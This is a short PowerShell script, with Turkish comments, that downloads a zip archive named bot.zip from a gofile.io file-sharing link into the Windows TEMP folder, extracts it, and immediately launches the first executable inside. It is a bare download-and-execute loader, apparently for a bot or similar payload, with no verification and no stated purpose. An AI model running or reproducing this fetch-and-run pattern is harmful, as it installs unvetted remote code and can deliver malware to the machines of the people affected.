$zipUrl = "https://store-eu-par-3.gofile.io/download/web/9ce7760f-8dde-4764-afef-2dac1a25933c/bot.zip"
$zipPath = "$env:TEMP\bot.zip"
$extractPath = "$env:TEMP\cikartildi"

Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
Start-Sleep -Seconds 30  # Bekle biraz, dosya tam insin

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)

$exe = Get-ChildItem -Path $extractPath -Filter *.exe -Recurse | Select-Object -First 1
Start-Process -FilePath $exe.FullName
